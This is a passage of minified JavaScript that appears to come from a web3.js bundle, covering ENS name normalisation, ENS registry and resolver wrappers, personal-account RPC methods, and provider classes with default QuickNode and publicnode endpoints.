        return e.P.has(t) || e.Q.has(t)
    }
    class O9 extends Array {
        get is_emoji() {
            return !0
        }
    }
    let rm, I2, Hi, im, C2, rs, hh, Ro, Si, u1, om;

    function yg() {
        if (rm) return;
        let e = p2(h9);
        const t = () => _l(e),
            n = () => new Set(t()),
            r = (c, d) => d.forEach(f => c.add(f));
        rm = new Map(g2(e)), I2 = n(), Hi = t(), im = new Set(t().map(c => Hi[c])), Hi = new Set(Hi), C2 = n(), n();
        let i = m2(e),
            o = e();
        const s = () => {
            let c = new Set;
            return t().forEach(d => r(c, i[d])), r(c, t()), c
        };
        rs = Sl(c => {
            let d = Sl(e).map(f => f + 96);
            if (d.length) {
                let f = c >= o;
                d[0] -= 32, d = Cs(d), f && (d = `Restricted[${d}]`);
                let h = s(),
                    v = s(),
                    p = !e();
                return {
                    N: d,
                    P: h,
                    Q: v,
                    M: p,
                    R: f
                }
            }
        }), hh = n(), Ro = new Map;
        let a = t().concat(ld(hh)).sort((c, d) => c - d);
        a.forEach((c, d) => {
            let f = e(),
                h = a[d] = f ? a[d - f] : {
                    V: [],
                    M: new Map
                };
            h.V.push(c), hh.has(c) || Ro.set(c, h)
        });
        for (let {
                V: c,
                M: d
            } of new Set(Ro.values())) {
            let f = [];
            for (let v of c) {
                let p = rs.filter(m => Tl(m, v)),
                    w = f.find(({
                        G: m
                    }) => p.some(g => m.has(g)));
                w || (w = {
                    G: new Set,
                    V: []
                }, f.push(w)), w.V.push(v), r(w.G, p)
            }
            let h = f.flatMap(v => ld(v.G));
            for (let {
                    G: v,
                    V: p
                } of f) {
                let w = new Set(h.filter(m => !v.has(m)));
                for (let m of p) d.set(m, w)
            }
        }
        Si = new Set;
        let l = new Set;
        const u = c => Si.has(c) ? l.add(c) : Si.add(c);
        for (let c of rs) {
            for (let d of c.P) u(d);
            for (let d of c.Q) u(d)
        }
        for (let c of Si) !Ro.has(c) && !l.has(c) && Ro.set(c, T2);
        r(Si, _2(Si)), u1 = x9(e).map(c => O9.from(c)).sort(_9), om = new Map;
        for (let c of u1) {
            let d = [om];
            for (let f of c) {
                let h = d.map(v => {
                    let p = v.get(f);
                    return p || (p = new Map, v.set(f, p)), p
                });
                f === k2 ? d.push(...h) : d = h
            }
            for (let f of d) f.V = c
        }
    }

    function wg(e) {
        return (P2(e) ? "" : `${bg(hf([e]))} `) + y2(e)
    }

    function bg(e) {
        return `"${e}"‎`
    }

    function L9(e) {
        if (e.length >= 4 && e[2] == c1 && e[3] == c1) throw new Error(`invalid label extension: "${Cs(e.slice(0,4))}"`)
    }

    function F9(e) {
        for (let n = e.lastIndexOf(95); n > 0;)
            if (e[--n] !== 95) throw new Error("underscore allowed only at start")
    }

    function D9(e) {
        let t = e[0],
            n = s1.get(t);
        if (n) throw Ba(`leading ${n}`);
        let r = e.length,
            i = -1;
        for (let o = 1; o < r; o++) {
            t = e[o];
            let s = s1.get(t);
            if (s) {
                if (i == o) throw Ba(`${n} + ${s}`);
                i = o + 1, n = s
            }
        }
        if (i == r) throw Ba(`trailing ${n}`)
    }

    function hf(e, t = 1 / 0, n = y2) {
        let r = [];
        j9(e[0]) && r.push("◌"), e.length > t && (t >>= 1, e = [...e.slice(0, t), 8230, ...e.slice(-t)]);
        let i = 0,
            o = e.length;
        for (let s = 0; s < o; s++) {
            let a = e[s];
            P2(a) && (r.push(Cs(e.slice(i, s))), r.push(n(a)), i = s + 1)
        }
        return r.push(Cs(e.slice(i, o))), r.join("")
    }

    function j9(e, t) {
        return yg(), Hi.has(e)
    }

    function P2(e) {
        return yg(), C2.has(e)
    }

    function H9(e) {
        return G9($9(e, M9, q9))
    }

    function $9(e, t, n) {
        if (!e) return [];
        yg();
        let r = 0;
        return e.split(S2).map(i => {
            let o = A9(i),
                s = {
                    input: o,
                    offset: r
                };
            r += o.length + 1;
            try {
                let a = s.tokens = W9(o, t, n),
                    l = a.length,
                    u;
                if (!l) throw new Error("empty label");
                let c = s.output = a.flat();
                if (F9(c), !(s.emoji = l > 1 || a[0].is_emoji) && c.every(f => f < 128)) L9(c), u = "ASCII";
                else {
                    let f = a.flatMap(h => h.is_emoji ? [] : h);
                    if (!f.length) u = "Emoji";
                    else {
                        if (Hi.has(c[0])) throw Ba("leading combining mark");
                        for (let p = 1; p < l; p++) {
                            let w = a[p];
                            if (!w.is_emoji && Hi.has(w[0])) throw Ba(`emoji + combining mark: "${Cs(a[p-1])} + ${hf([w[0]])}"`)
                        }
                        D9(c);
                        let h = ld(new Set(f)),
                            [v] = z9(h);
                        V9(v, f), U9(v, h), u = v.N
                    }
                }
                s.type = u
            } catch (a) {
                s.error = a
            }
            return s
        })
    }

    function U9(e, t) {
        let n, r = [];
        for (let i of t) {
            let o = Ro.get(i);
            if (o === T2) return;
            if (o) {
                let s = o.M.get(i);
                if (n = n ? n.filter(a => s.has(a)) : ld(s), !n.length) return
            } else r.push(i)
        }
        if (n) {
            for (let i of n)
                if (r.every(o => Tl(i, o))) throw new Error(`whole-script confusable: ${e.N}/${i.N}`)
        }
    }

    function z9(e) {
        let t = rs;
        for (let n of e) {
            let r = t.filter(i => Tl(i, n));
            if (!r.length) throw rs.some(i => Tl(i, n)) ? N2(t[0], n) : R2(n);
            if (t = r, r.length == 1) break
        }
        return t
    }

    function G9(e) {
        return e.map(({
            input: t,
            error: n,
            output: r
        }) => {
            if (n) {
                let i = n.message;
                throw new Error(e.length == 1 ? i : `Invalid label ${bg(hf(t,63))}: ${i}`)
            }
            return Cs(r)
        }).join(S2)
    }

    function R2(e) {
        return new Error(`disallowed character: ${wg(e)}`)
    }

    function N2(e, t) {
        let n = wg(t),
            r = rs.find(i => i.P.has(t));
        return r && (n = `${r.N} ${n}`), new Error(`illegal mixture: ${e.N} + ${n}`)
    }

    function Ba(e) {
        return new Error(`illegal placement: ${e}`)
    }

    function V9(e, t) {
        for (let n of t)
            if (!Tl(e, n)) throw N2(e, n);
        if (e.M) {
            let n = _2(t);
            for (let r = 1, i = n.length; r < i; r++)
                if (im.has(n[r])) {
                    let o = r + 1;
                    for (let s; o < i && im.has(s = n[o]); o++)
                        for (let a = r; a < o; a++)
                            if (n[a] == s) throw new Error(`duplicate non-spacing marks: ${wg(s)}`);
                    if (o - r > a1) throw new Error(`excessive non-spacing marks: ${bg(hf(n.slice(r-1,o)))} (${o-r}/${a1})`);
                    r = o
                }
        }
    }

    function W9(e, t, n) {
        let r = [],
            i = [];
        for (e = e.slice().reverse(); e.length;) {
            let o = Q9(e);
            if (o) i.length && (r.push(t(i)), i = []), r.push(n(o));
            else {
                let s = e.pop();
                if (Si.has(s)) i.push(s);
                else {
                    let a = rm.get(s);
                    if (a) i.push(...a);
                    else if (!I2.has(s)) throw R2(s)
                }
            }
        }
        return i.length && r.push(t(i)), r
    }

    function q9(e) {
        return e.filter(t => t != k2)
    }

    function Q9(e, t) {
        let n = om,
            r, i = e.length;
        for (; i && (n = n.get(e[--i]), !!n);) {
            let {
                V: o
            } = n;
            o && (r = o, e.length = i)
        }
        return r
    }
    const K9 = e => H9(e),
        Ln = e => {
            let t = "";
            for (let n = 0; n < 32; n += 1) t += "00";
            if (e) {
                const r = K9(e).split(".");
                for (let i = r.length - 1; i >= 0; i -= 1) {
                    const o = Yt(r[i]).slice(2);
                    t = Yt(`0x${t}${o}`).slice(2)
                }
            }
            return `0x${t}`
        };
    var vc = function(e, t, n, r) {
        function i(o) {
            return o instanceof n ? o : new n(function(s) {
                s(o)
            })
        }
        return new(n || (n = Promise))(function(o, s) {
            function a(c) {
                try {
                    u(r.next(c))
                } catch (d) {
                    s(d)
                }
            }

            function l(c) {
                try {
                    u(r.throw(c))
                } catch (d) {
                    s(d)
                }
            }

            function u(c) {
                c.done ? o(c.value) : i(c.value).then(a, l)
            }
            u((r = r.apply(e, t || [])).next())
        })
    };
    class Z9 {
        constructor(t, n) {
            this.contract = new Ki(d9, n ?? rd.main, t), this.context = t
        }
        getOwner(t) {
            return vc(this, void 0, void 0, function*() {
                try {
                    return this.contract.methods.owner(Ln(t)).call()
                } catch {
                    throw new Error
                }
            })
        }
        getTTL(t) {
            return vc(this, void 0, void 0, function*() {
                try {
                    return this.contract.methods.ttl(Ln(t)).call()
                } catch {
                    throw new Error
                }
            })
        }
        recordExists(t) {
            return vc(this, void 0, void 0, function*() {
                try {
                    return this.contract.methods.recordExists(Ln(t)).call()
                } catch {
                    throw new Error
                }
            })
        }
        getResolver(t) {
            return vc(this, void 0, void 0, function*() {
                try {
                    return this.contract.methods.resolver(Ln(t)).call().then(n => {
                        if (typeof n == "string") return new Ki(f9, n, this.context);
                        throw new Error
                    })
                } catch {
                    throw new Error
                }
            })
        }
        get events() {
            return this.contract.events
        }
    }
    var rr = function(e, t, n, r) {
        function i(o) {
            return o instanceof n ? o : new n(function(s) {
                s(o)
            })
        }
        return new(n || (n = Promise))(function(o, s) {
            function a(c) {
                try {
                    u(r.next(c))
                } catch (d) {
                    s(d)
                }
            }

            function l(c) {
                try {
                    u(r.throw(c))
                } catch (d) {
                    s(d)
                }
            }

            function u(c) {
                c.done ? o(c.value) : i(c.value).then(a, l)
            }
            u((r = r.apply(e, t || [])).next())
        })
    };
    class Y9 {
        constructor(t) {
            this.registry = t
        }
        getResolverContractAdapter(t) {
            return rr(this, void 0, void 0, function*() {
                return this.registry.getResolver(t)
            })
        }
        checkInterfaceSupport(t, n) {
            var r, i;
            return rr(this, void 0, void 0, function*() {
                if (X(o1[n])) throw new ay((r = t.options.address) !== null && r !== void 0 ? r : "", n);
                if (!(yield t.methods.supportsInterface(o1[n]).call())) throw new ay((i = t.options.address) !== null && i !== void 0 ? i : "", n)
            })
        }
        supportsInterface(t, n) {
            var r;
            return rr(this, void 0, void 0, function*() {
                const i = yield this.getResolverContractAdapter(t);
                let o = n;
                if (!ye(o)) {
                    if (o = (r = Gl(n)) !== null && r !== void 0 ? r : "", n === "") throw new Error("Invalid interface Id");
                    o = o.slice(0, 10)
                }
                return i.methods.supportsInterface(o).call()
            })
        }
        getAddress(t, n = 60) {
            return rr(this, void 0, void 0, function*() {
                const r = yield this.getResolverContractAdapter(t);
                return yield this.checkInterfaceSupport(r, To.addr), r.methods.addr(Ln(t), n).call()
            })
        }
        getPubkey(t) {
            return rr(this, void 0, void 0, function*() {
                const n = yield this.getResolverContractAdapter(t);
                return yield this.checkInterfaceSupport(n, To.pubkey), n.methods.pubkey(Ln(t)).call()
            })
        }
        getContenthash(t) {
            return rr(this, void 0, void 0, function*() {
                const n = yield this.getResolverContractAdapter(t);
                return yield this.checkInterfaceSupport(n, To.contenthash), n.methods.contenthash(Ln(t)).call()
            })
        }
        setAddress(t, n, r) {
            return rr(this, void 0, void 0, function*() {
                const i = yield this.getResolverContractAdapter(t);
                return yield this.checkInterfaceSupport(i, To.setAddr), i.methods.setAddr(Ln(t), n).send(r)
            })
        }
        getText(t, n) {
            return rr(this, void 0, void 0, function*() {
                const r = yield this.getResolverContractAdapter(t);
                return yield this.checkInterfaceSupport(r, To.text), r.methods.text(Ln(t), n).call()
            })
        }
        getName(t, n = !0) {
            return rr(this, void 0, void 0, function*() {
                const r = `${t.toLowerCase().substring(2)}.addr.reverse`,
                    i = yield this.getResolverContractAdapter(r);
                return n && (yield this.checkInterfaceSupport(i, To.name)), i.methods.name(Ln(r)).call()
            })
        }
    }
    var nn = function(e, t, n, r) {
        function i(o) {
            return o instanceof n ? o : new n(function(s) {
                s(o)
            })
        }
        return new(n || (n = Promise))(function(o, s) {
            function a(c) {
                try {
                    u(r.next(c))
                } catch (d) {
                    s(d)
                }
            }

            function l(c) {
                try {
                    u(r.throw(c))
                } catch (d) {
                    s(d)
                }
            }

            function u(c) {
                c.done ? o(c.value) : i(c.value).then(a, l)
            }
            u((r = r.apply(e, t || [])).next())
        })
    };
    class B2 extends Lt {
        constructor(t, n) {
            super(n ?? ""), this.registryAddress = t ?? rd.main, this._registry = new Z9(this.getContextObject(), t), this._resolver = new Y9(this._registry)
        }
        getResolver(t) {
            return nn(this, void 0, void 0, function*() {
                return this._registry.getResolver(t)
            })
        }
        recordExists(t) {
            return nn(this, void 0, void 0, function*() {
                return this._registry.recordExists(t)
            })
        }
        getTTL(t) {
            return nn(this, void 0, void 0, function*() {
                return this._registry.getTTL(t)
            })
        }
        getOwner(t) {
            return nn(this, void 0, void 0, function*() {
                return this._registry.getOwner(t)
            })
        }
        getAddress(t, n = 60) {
            return nn(this, void 0, void 0, function*() {
                return this._resolver.getAddress(t, n)
            })
        }
        getText(t, n) {
            return nn(this, void 0, void 0, function*() {
                return Zt(t) ? this._resolver.getText(yield this._resolver.getName(t, !1), n) : this._resolver.getText(t, n)
            })
        }
        getName(t, n = !0) {
            return nn(this, void 0, void 0, function*() {
                return this._resolver.getName(t, n)
            })
        }
        getPubkey(t) {
            return nn(this, void 0, void 0, function*() {
                return this._resolver.getPubkey(t)
            })
        }
        getContenthash(t) {
            return nn(this, void 0, void 0, function*() {
                return this._resolver.getContenthash(t)
            })
        }
        checkNetwork() {
            return nn(this, void 0, void 0, function*() {
                const t = Date.now() / 1e3;
                if (!this._lastSyncCheck || t - this._lastSyncCheck > 3600) {
                    const i = yield EO(this);
                    if (!(typeof i == "boolean" && !i)) throw new O4;
                    this._lastSyncCheck = t
                }
                if (this._detectedAddress) return this._detectedAddress;
                const n = yield og(this, Object.assign(Object.assign({}, this.defaultReturnFormat), {
                    number: dn.HEX
                })), r = rd[u9[n]];
                if (typeof r > "u") throw new M4(n);
                return this._detectedAddress = r, this._detectedAddress
            })
        }
        supportsInterface(t, n) {
            return nn(this, void 0, void 0, function*() {
                return this._resolver.supportsInterface(t, n)
            })
        }
        get events() {
            return this._registry.events
        }
        setAddress(t, n, r) {
            return nn(this, void 0, void 0, function*() {
                return this._resolver.setAddress(t, n, r)
            })
        }
    }
    var Pr = function(e, t, n, r) {
        function i(o) {
            return o instanceof n ? o : new n(function(s) {
                s(o)
            })
        }
        return new(n || (n = Promise))(function(o, s) {
            function a(c) {
                try {
                    u(r.next(c))
                } catch (d) {
                    s(d)
                }
            }

            function l(c) {
                try {
                    u(r.throw(c))
                } catch (d) {
                    s(d)
                }
            }

            function u(c) {
                c.done ? o(c.value) : i(c.value).then(a, l)
            }
            u((r = r.apply(e, t || [])).next())
        })
    };
    const J9 = e => Pr(void 0, void 0, void 0, function*() {
            return (yield nM(e)).map(Xn)
        }),
        X9 = (e, t) => Pr(void 0, void 0, void 0, function*() {
            Y.validate(["string"], [t]);
            const n = yield rM(e, t);
            return Xn(n)
        }),
        eL = (e, t, n, r) => Pr(void 0, void 0, void 0, function*() {
            return Y.validate(["address", "string", "uint"], [t, n, r]), iM(e, t, n, r)
        }),
        tL = (e, t) => Pr(void 0, void 0, void 0, function*() {
            return Y.validate(["address"], [t]), oM(e, t)
        }),
        nL = (e, t, n) => Pr(void 0, void 0, void 0, function*() {
            return Y.validate(["string", "string"], [t, n]), sM(e, t, n)
        }),
        rL = (e, t, n, r) => Pr(void 0, void 0, void 0, function*() {
            const i = Ht(t, oe, {
                transactionSchema: r == null ? void 0 : r.customTransactionSchema
            });
            return aM(e, i, n)
        }),
        iL = (e, t, n, r) => Pr(void 0, void 0, void 0, function*() {
            const i = Ht(t, oe, {
                transactionSchema: r == null ? void 0 : r.customTransactionSchema
            });
            return lM(e, i, n)
        }),
        oL = (e, t, n, r) => Pr(void 0, void 0, void 0, function*() {
            Y.validate(["string", "address", "string"], [t, n, r]);
            const i = ye(t) ? t : Pn(t);
            return cM(e, i, n, r)
        }),
        sL = (e, t, n) => Pr(void 0, void 0, void 0, function*() {
            Y.validate(["string", "string"], [t, n]);
            const r = ye(t) ? t : Pn(t);
            return uM(e, r, n)
        });
    var ir = function(e, t, n, r) {
        function i(o) {
            return o instanceof n ? o : new n(function(s) {
                s(o)
            })
        }
        return new(n || (n = Promise))(function(o, s) {
            function a(c) {
                try {
                    u(r.next(c))
                } catch (d) {
                    s(d)
                }
            }

            function l(c) {
                try {
                    u(r.throw(c))
                } catch (d) {
                    s(d)
                }
            }

            function u(c) {
                c.done ? o(c.value) : i(c.value).then(a, l)
            }
            u((r = r.apply(e, t || [])).next())
        })
    };
    class M2 extends Lt {
        getAccounts() {
            return ir(this, void 0, void 0, function*() {
                return J9(this.requestManager)
            })
        }
        newAccount(t) {
            return ir(this, void 0, void 0, function*() {
                return X9(this.requestManager, t)
            })
        }
        unlockAccount(t, n, r) {
            return ir(this, void 0, void 0, function*() {
                return eL(this.requestManager, t, n, r)
            })
        }
        lockAccount(t) {
            return ir(this, void 0, void 0, function*() {
                return tL(this.requestManager, t)
            })
        }
        importRawKey(t, n) {
            return ir(this, void 0, void 0, function*() {
                return nL(this.requestManager, t, n)
            })
        }
        sendTransaction(t, n) {
            return ir(this, void 0, void 0, function*() {
                return rL(this.requestManager, t, n, this.config)
            })
        }
        signTransaction(t, n) {
            return ir(this, void 0, void 0, function*() {
                return iL(this.requestManager, t, n, this.config)
            })
        }
        sign(t, n, r) {
            return ir(this, void 0, void 0, function*() {
                return oL(this.requestManager, t, n, r)
            })
        }
        ecRecover(t, n) {
            return ir(this, void 0, void 0, function*() {
                return sL(this.requestManager, t, n)
            })
        }
    }
    var Hn;
    (function(e) {
        e.HTTPS = "https", e.WebSocket = "wss"
    })(Hn || (Hn = {}));
    var G;
    (function(e) {
        e.ETH_MAINNET = "eth_mainnet", e.ETH_SEPOLIA = "eth_sepolia", e.ETH_HOLESKY = "eth_holesky", e.POLYGON_MAINNET = "polygon_mainnet", e.POLYGON_AMOY = "polygon_amoy", e.AVALANCHE_C_MAINNET = "avalanche_c_mainnet", e.AVALANCHE_P_MAINNET = "avalanche_p_mainnet", e.AVALANCHE_X_MAINNET = "avalanche_x_mainnet", e.ARBITRUM_MAINNET = "arbitrum_mainnet", e.ARBITRUM_SEPOLIA = "arbitrum_sepolia", e.BASE_MAINNET = "base_mainnet", e.BASE_SEPOLIA = "base_sepolia", e.OPTIMISM_MAINNET = "optimism_mainnet", e.OPTIMISM_SEPOLIA = "optimism_sepolia", e.FANTOM_MAINNET = "fantom_mainnet", e.FANTOM_TESTNET = "fantom_testnet", e.DYMENSION_MAINNET = "dymension_mainnet", e.DYMENSION_TESTNET = "dymension_testnet", e.BNB_MAINNET = "bnb_mainnet", e.BNB_TESTNET = "bnb_testnet", e.BSC_MAINNET = "bsc_mainnet", e.BSC_TESTNET = "bsc_testnet", e.ARBITRUM_ONE = "arbitrum_one", e.ARBITRUM_NOVA = "arbitrum_nova", e.AVALANCHE_FUJI_C = "avalanche_fuji_c", e.AVALANCHE_FUJI_P = "avalanche_fuji_p", e.AVALANCHE_FUJI_X = "avalanche_fuji_x", e.BLAST_MAINNET = "blast_mainnet", e.OPBNB_MAINNET = "opbnb_mainnet", e.OPBNB_TESTNET = "opbnb_testnet", e.GNOSIS_MAINNET = "gnosis_mainnet", e.GNOSIS_CHIADO = "gnosis_chiado", e.PULSECHAIN_MAINNET = "pulsechain_mainnet", e.PULSECHAIN_TESTNET = "pulsechain_testnet", e.KAVA_MAINNET = "kava_mainnet", e.CRONOS_MAINNET = "cronos_mainnet", e.MANTLE_MAINNET = "mantle_mainnet", e.CHILIZ_MAINNET = "chiliz_mainnet", e.CHILIZ_SPICY = "chiliz_spicy", e.MOONBEAM_MAINNET = "moonbeam_mainnet", e.TAIKO_MAINNET = "taiko_mainnet", e.TAIKO_HEKLA = "taiko_hekla", e.LINEA_MAINNET = "linea_mainnet", e.LINEA_SEPOLIA = "linea_sepolia", e.BAHAMUT_MAINNET = "bahamut_mainnet", e.SCROLL_MAINNET = "scroll_mainnet", e.SCROLL_SEPOLIA = "scroll_sepolia", e.TRON_MAINNET = "tron_mainnet", e.SYSCOIN_MAINNET = "syscoin_mainnet", e.SYSCOIN_TANENBAUM = "syscoin_tanenbaum", e.MOONRIVER_MAINNET = "moonriver_mainnet", e.HAQQ_MAINNET = "haqq_mainnet", e.EVMOS_MAINNET = "evmos_mainnet", e.EVMOS_TESTNET = "evmos_testnet", e.BERACHAIN_TESTNET = "berachain_testnet"
    })(G || (G = {}));
    const aL = 1300;
    class lL extends ne {
        constructor(t) {
            super("You've reach the rate limit of free RPC calls from our Partner Quick Nodes. There are two options you can either create a paid Quick Nodes account and get 20% off for 2 months using WEB3JS referral code, or use Free public RPC endpoint.", t), this.code = aL
        }
    }
    const cL = 1301;
    class d1 extends ne {
        constructor(t) {
            super(`Invalid provider config options given for ${t}`), this.code = cL
        }
    }
    var uL = function(e, t, n, r) {
        function i(o) {
            return o instanceof n ? o : new n(function(s) {
                s(o)
            })
        }
        return new(n || (n = Promise))(function(o, s) {
            function a(c) {
                try {
                    u(r.next(c))
                } catch (d) {
                    s(d)
                }
            }

            function l(c) {
                try {
                    u(r.throw(c))
                } catch (d) {
                    s(d)
                }
            }

            function u(c) {
                c.done ? o(c.value) : i(c.value).then(a, l)
            }
            u((r = r.apply(e, t || [])).next())
        })
    };
    class O2 extends U0 {
        constructor(t, n, r, i, o) {
            if (super(), o !== void 0 && n === Hn.HTTPS && !("providerOptions" in o)) throw new d1("HTTP Provider");
            if (o !== void 0 && n === Hn.WebSocket && !("socketOptions" in o || "reconnectOptions" in o)) throw new d1("Websocket Provider");
            this.transport = n, n === Hn.HTTPS ? this.provider = new tf(this.getRPCURL(t, n, r, i), o) : n === Hn.WebSocket && (this.provider = new HE(this.getRPCURL(t, n, r, i), o == null ? void 0 : o.socketOptions, o == null ? void 0 : o.reconnectOptions))
        }
        request(t, n) {
            return uL(this, void 0, void 0, function*() {
                return this.transport === Hn.HTTPS ? yield this.provider.request(t, n): this.provider.request(t)
            })
        }
        getStatus() {
            return this.provider.getStatus()
        }
        supportsSubscriptions() {
            return this.provider.supportsSubscriptions()
        }
        once(t, n) {
            var r;
            !((r = this.provider) === null || r === void 0) && r.once && this.provider.once(t, n)
        }
        removeAllListeners(t) {
            var n;
            !((n = this.provider) === null || n === void 0) && n.removeAllListeners && this.provider.removeAllListeners(t)
        }
        connect() {
            var t;
            !((t = this.provider) === null || t === void 0) && t.connect && this.provider.connect()
        }
        disconnect(t, n) {
            var r;
            !((r = this.provider) === null || r === void 0) && r.disconnect && this.provider.disconnect(t, n)
        }
        reset() {
            var t;
            !((t = this.provider) === null || t === void 0) && t.reset && this.provider.reset()
        }
        on(t, n) {
            this.provider && this.provider.on(t, n)
        }
        removeListener(t, n) {
            this.provider && this.provider.removeListener(t, n)
        }
    }
    var dL = function(e, t, n, r) {
        function i(o) {
            return o instanceof n ? o : new n(function(s) {
                s(o)
            })
        }
        return new(n || (n = Promise))(function(o, s) {
            function a(c) {
                try {
                    u(r.next(c))
                } catch (d) {
                    s(d)
                }
            }

            function l(c) {
                try {
                    u(r.throw(c))
                } catch (d) {
                    s(d)
                }
            }

            function u(c) {
                c.done ? o(c.value) : i(c.value).then(a, l)
            }
            u((r = r.apply(e, t || [])).next())
        })
    };
    const Ye = e => e !== void 0 && e.trim().length > 0;
    class fL extends O2 {
        constructor(t = G.ETH_MAINNET, n = Hn.HTTPS, r = "", i = "", o) {
            super(t, n, r, i, o)
        }
        request(t, n) {
            const r = Object.create(null, {
                request: {
                    get: () => super.request
                }
            });
            return dL(this, void 0, void 0, function*() {
                try {
                    return yield r.request.call(this, t, n)
                } catch (i) {
                    throw i instanceof Dn && i.statusCode === 429 ? new lL(i) : i
                }
            })
        }
        getRPCURL(t, n, r, i) {
            let o = "",
                s = "";
            switch (t) {
                case G.ETH_MAINNET:
                    o = Ye(i) ? i : "powerful-holy-bush.quiknode.pro", s = Ye(r) ? r : "3240624a343867035925ff7561eb60dfdba2a668";
                    break;
                case G.ETH_SEPOLIA:
                    o = Ye(i) ? i : "dimensional-fabled-glitter.ethereum-sepolia.quiknode.pro", s = Ye(r) ? r : "382a3b5a4b938f2d6e8686c19af4b22921fde2cd";
                    break;
                case G.ETH_HOLESKY:
                    o = Ye(i) ? i : "yolo-morning-card.ethereum-holesky.quiknode.pro", s = Ye(r) ? r : "481ebe70638c4dcf176af617a16d02ab866b9af9";
                    break;
                case G.ARBITRUM_MAINNET:
                    o = Ye(i) ? i : "autumn-divine-dinghy.arbitrum-mainnet.quiknode.pro", s = Ye(r) ? r : "a5d7bfbf60b5ae9ce3628e53d69ef50d529e9a8c";
                    break;
                case G.ARBITRUM_SEPOLIA:
                    o = Ye(i) ? i : "few-patient-pond.arbitrum-sepolia.quiknode.pro", s = Ye(r) ? r : "3be985450970628c860b959c65cd2642dcafe53c";
                    break;
                case G.BNB_MAINNET:
                    o = Ye(i) ? i : "purple-empty-reel.bsc.quiknode.pro", s = Ye(r) ? r : "ebf6c532961e21f092ff2facce1ec4c89c540158";
                    break;
                case G.BNB_TESTNET:
                    o = Ye(i) ? i : "floral-rough-scion.bsc-testnet.quiknode.pro", s = Ye(r) ? r : "5b297e5acff5f81f4c37ebf6f235f7299b6f9d28";
                    break;
                case G.POLYGON_MAINNET:
                    o = Ye(i) ? i : "small-chaotic-moon.matic.quiknode.pro", s = Ye(r) ? r : "847569f8a017e84d985e10d0f44365d965a951f1";
                    break;
                case G.POLYGON_AMOY:
                    o = Ye(i) ? i : "prettiest-side-shape.matic-amoy.quiknode.pro", s = Ye(r) ? r : "79a9476eea661d4f82de614db1d8a895b14b881c";
                    break;
                default:
                    throw new Error("Network info not avalible.")
            }
            return `${n}://${o}/${s}`
        }
    }
    const hL = e => e !== void 0 && e.trim().length > 0,
        pL = [G.DYMENSION_MAINNET, G.DYMENSION_TESTNET, G.KAVA_MAINNET, G.CRONOS_MAINNET, G.POLYGON_MAINNET];
    class cd extends O2 {
        constructor(t = G.ETH_MAINNET, n = Hn.HTTPS, r = "", i) {
            super(t, n, "", r, i)
        }
        getRPCURL(t, n, r, i) {
            if (!cd.networkHostMap[t]) throw new Error("Network info not avalible.");
            const o = `${cd.networkHostMap[t]}.publicnode.com`,
                s = hL(i) ? i : o;
            return pL.includes(t) && n === Hn.WebSocket ? `${n}://${s}/websocket` : `${n}://${s}`
        }
    }
    cd.networkHostMap = {
        [G.POLYGON_AMOY]: "polygon-amoy-bor-rpc",
        [G.DYMENSION_MAINNET]: "dymension-evm-rpc",
        [G.DYMENSION_TESTNET]: "dymension-testnet-evm-rpc",
        [G.BLAST_MAINNET]: "blast-rpc",
        [G.GNOSIS_MAINNET]: "gnosis-rpc",
        [G.PULSECHAIN_MAINNET]: "pulsechain-rpc",
        [G.PULSECHAIN_TESTNET]: "pulsechain-testnet-rpc",
        [G.KAVA_MAINNET]: "kava-evm-rpc",
        [G.CRONOS_MAINNET]: "cronos-evm-rpc",
        [G.MANTLE_MAINNET]: "mantle-rpc",
        [G.TAIKO_MAINNET]: "taiko-rpc",
        [G.TAIKO_HEKLA]: "taiko-hekla-rpc",
        [G.LINEA_MAINNET]: "linea-rpc",
        [G.LINEA_SEPOLIA]: "linea-sepolia-rpc",
        [G.SCROLL_MAINNET]: "scroll-rpc",
        [G.SCROLL_SEPOLIA]: "scroll-sepolia-rpc",
        [G.SYSCOIN_MAINNET]: "syscoin-evm-rpc",
        [G.SYSCOIN_TANENBAUM]: "syscoin-tanenbaum-evm-rpc",
        [G.HAQQ_MAINNET]: "haqq-evm-rpc",
        [G.EVMOS_MAINNET]: "evmos-evm-rpc",
        [G.EVMOS_TESTNET]: "evmos-testnet-evm-rpc",
        [G.BERACHAIN_TESTNET]: "berachain-testnet-evm-rpc",
        [G.ETH_MAINNET]: "ethereum-rpc",
        [G.ETH_SEPOLIA]: "ethereum-sepolia-rpc",
        [G.ETH_HOLESKY]: "ethereum-holesky-rpc",
        [G.BSC_MAINNET]: "bsc-rpc",
        [G.BSC_TESTNET]: "bsc-testnet-rpc",
        [G.POLYGON_MAINNET]: "polygon-bor-rpc",
        [G.BASE_MAINNET]: "base-rpc",
        [G.BASE_SEPOLIA]: "base-sepolia-rpc",
        [G.ARBITRUM_ONE]: "arbitrum-one-rpc",
        [G.ARBITRUM_NOVA]: "arbitrum-nova-rpc",
        [G.ARBITRUM_SEPOLIA]: "arbitrum-sepolia-rpc",
        [G.AVALANCHE_C_MAINNET]: "avalanche-c-chain-rpc",
        [G.AVALANCHE_P_MAINNET]: "avalanche-p-chain-rpc",
        [G.AVALANCHE_X_MAINNET]: "avalanche-x-chain-rpc",
        [G.AVALANCHE_FUJI_C]: "avalanche-fuji-c-chain-rpc",
        [G.AVALANCHE_FUJI_P]: "avalanche-fuji-p-chain-rpc",
        [G.AVALANCHE_FUJI_X]: "avalanche-fuji-x-chain-rpc",
        [G.OPTIMISM_MAINNET]: "optimism-rpc",
        [G.OPTIMISM_SEPOLIA]: "optimism-sepolia-rpc",
        [G.FANTOM_MAINNET]: "fantom-rpc",
        [G.FANTOM_TESTNET]: "fantom-testnet-rpc",
        [G.OPBNB_MAINNET]: "opbnb-rpc",
        [G.OPBNB_TESTNET]: "opbnb-testnet-rpc",
        [G.GNOSIS_CHIADO]: "gnosis-chiado-rpc",
        [G.CHILIZ_MAINNET]: "chiliz-rpc",
        [G.CHILIZ_SPICY]: "chiliz-spicy-rpc",
        [G.MOONBEAM_MAINNET]: "moonbeam-rpc",
        [G.BAHAMUT_MAINNET]: "bahamut-rpc",
        [G.TRON_MAINNET]: "tron-evm-rpc",
        [G.MOONRIVER_MAINNET]: "moonriver-rpc"
    };
    const mL = new fL,
        gL = {
            encodeEventSignature: cg,
            encodeFunctionCall: pO,
            encodeFunctionSignature: El,
            encodeParameter: Yp,
            encodeParameters: uf,
            decodeParameter: t2,
            decodeParameters: Qi,
            decodeLog: n2
        };
    var sa = function(e, t, n, r) {
        function i(o) {
            return o instanceof n ? o : new n(function(s) {
                s(o)
            })
        }
        return new(n || (n = Promise))(function(o, s) {
            function a(c) {
                try {
                    u(r.next(c))
                } catch (d) {
                    s(d)
                }
            }

